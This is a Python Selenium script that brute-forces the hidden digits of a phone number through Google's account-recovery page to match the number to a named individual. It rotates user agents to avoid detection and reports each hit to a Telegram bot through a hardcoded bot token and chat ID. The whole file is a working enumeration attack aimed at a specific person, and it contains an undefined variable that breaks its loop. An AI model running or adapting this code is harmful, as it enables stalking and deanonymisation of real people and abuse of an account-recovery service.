import os
from selenium import webdriver
from fake_useragent import UserAgent
import time

options = webdriver.ChromeOptions()
ua = UserAgent()
options.binary_location = os.environ.get("GOOGLE_CHROME_BIN")
options.add_argument("--headless")
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--no-sandbox')

first_mobile_digits = "6238"
last_mobile_digits = '85'
range = 1
first_name = 'Anikha'
last_name = 'Surendran'
tele_link = 'https://api.telegram.org/bot5658068312:AAF0zYz0AqLQLsWx7HQ6TPSJa08tj3PMoc0/sendMessage?chat_id=-1001674553287&text='
string1 = "Get a verification code"
string2 = "No account found"
error_mobile_numbers = []
i = 0

while i <= range:
    j = 0
    while j <= 9:
        k = 0
        while k <= 9:
            l = 0
            while l <= 9:
                userAgent = ua.random
                options.add_argument(f'user-agent={userAgent}')
                mobile_number = (first_mobile_digits + str(i) + str(j) + str(k) + str(l) + last_mobile_digits)
                browser = webdriver.Chrome(chrome_options=options, executable_path=os.environ.get("CHROMEDRIVER_PATH"))
                browser.get('https://accounts.google.com/signin/v2/usernamerecovery?hl=en-GB&continue=https%3A%2F%2Fmail.google.com&service=mail&ec=GAlAFw&flowName=GlifWebSignIn&flowEntry=AddSession')
                time.sleep(8)
                browser.find_element_by_xpath('//*[@id="recoveryIdentifierId"]').send_keys(mobile_number)
                time.sleep(1)
                browser.find_element_by_xpath('//*[@id="queryPhoneNext"]/div/button/span').click()
                time.sleep(8)
                browser.find_element_by_xpath('//*[@id="firstName"]').send_keys(first_name)
                time.sleep(1)
                browser.find_element_by_xpath('//*[@id="lastName"]').send_keys(last_name)
                time.sleep(1)
                browser.find_element_by_xpath('//*[@id="collectNameNext"]/div/button/span').click()
                time.sleep(8)
                target = browser.find_element_by_xpath('//*[@id="headingText"]/span').text
                if target == string1:
                    browser.get(tele_link + mobile_number + " matched" + " #done ")
                    break
                elif target == string2:
                    browser.get(tele_link + mobile_number + " not matched")
                else:
                    error_mobile_numbers.append(mobile_number)
                    browser.get(tele_link + "captcha or unknown error at " + mobile_number + "." + " heading = " + target + " #error ")
                time.sleep(3)
                browser.delete_all_cookies()
                browser.quit()
                if c == 0:
                    l = l + 1
            if target == string1:
                break
            k = k+1
        if target == string1:
            break
        j = j+1
    if target == string1:
        break
    i = i+1

len_errors = len(error_mobile_numbers)
time.sleep(1)
browser.get(tele_link + first_mobile_digits + " loop ended at " + mobile_number + " total errors = " + str(len_errors) + "." + " These are the numbers which faced errors " + " , ".join(error_mobile_numbers) + " #loopdone ")
time.sleep(3)
browser.quit()